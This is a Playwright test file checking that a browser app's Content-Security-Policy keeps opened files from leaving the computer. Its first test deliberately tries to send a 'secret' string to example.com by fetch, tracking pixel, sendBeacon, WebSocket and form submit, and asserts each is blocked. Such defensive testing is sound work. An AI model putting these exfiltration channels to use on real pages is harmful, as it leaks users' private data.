// The Content-Security-Policy (D-041): the page can't send anything to another origin, so a
// file you open stays on your computer even if the code tried to send it. Every other spec
// runs under the same policy, and a violation there is a console error, which fails the
// test, so they check the app itself works within it.

import { test as base, expect } from "@playwright/test";
import { start, needs, openFiles } from "../helpers.js";

// The plain Playwright `page`: here the blocked attempts are supposed to log errors.
const test = base;

test("the page can only talk to its own origin", async ({ page }) => {
  // A request only reaches the network (here, this route) if the policy let it through.
  const elsewhere = [];
  await page.route((url) => url.hostname !== "127.0.0.1", (route) => {
    elsewhere.push(route.request().url());
    return route.abort();
  });
  await start(page);

  const policy = await page.locator('meta[http-equiv="Content-Security-Policy"]').getAttribute("content");
  expect(policy).toContain("default-src 'none'");
  expect(policy).toContain("connect-src 'self'");
  expect(policy).toMatch(/script-src 'self' 'wasm-unsafe-eval' 'sha256-[^']+'/);
  expect(policy).not.toContain("unsafe-inline' 'sha");

  const blocked = await page.evaluate(async () => {
    const violations = [];
    document.addEventListener("securitypolicyviolation", (e) => violations.push(e.effectiveDirective));
    const out = {};
    out.fetch = await fetch("https://example.com/upload", { method: "POST", body: "secret" })
      .then(() => "sent")
      .catch(() => "blocked");
    out.image = await new Promise((resolve) => {
      const img = new Image();
      img.onload = () => resolve("sent");
      img.onerror = () => resolve("blocked");
      img.src = "https://example.com/pixel.gif?d=secret";
    });
    out.beacon = navigator.sendBeacon("https://example.com/b", "secret") ? "queued" : "blocked";
    out.websocket = await new Promise((resolve) => {
      try {
        const ws = new WebSocket("wss://example.com/ws");
        ws.onopen = () => resolve("sent");
        ws.onerror = () => resolve("blocked");
      } catch {
        resolve("blocked");
      }
    });
    const form = Object.assign(document.createElement("form"), { action: "https://example.com/f", method: "post" });
    document.body.append(form);
    form.submit();
    await new Promise((r) => setTimeout(r, 300));
    out.violations = [...new Set(violations)].sort();
    return out;
  });
  expect(blocked.fetch).toBe("blocked");
  expect(blocked.image).toBe("blocked");
  expect(blocked.websocket).toBe("blocked");
  expect(blocked.violations).toEqual(expect.arrayContaining(["connect-src", "img-src", "form-action"]));
  expect(elsewhere).toEqual([]);
});

test("opening and exporting work within the policy", async ({ page }) => {
  const board = needs("board");
  const violations = [];
  page.on("console", (m) => {
    if (m.type() === "error" && /Content Security Policy|Refused to/i.test(m.text())) violations.push(m.text());
  });
  await start(page);
  await openFiles(page, board.dtb);
  await page.getByRole("button", { name: "Export ▾" }).click();
  const [png] = await Promise.all([
    page.waitForEvent("download"),
    page.locator(".menu-panel").getByRole("button", { name: "PNG", exact: true }).click(),
  ]);
  expect(png.suggestedFilename()).toMatch(/\.png$/);
  expect(violations).toEqual([]);
});
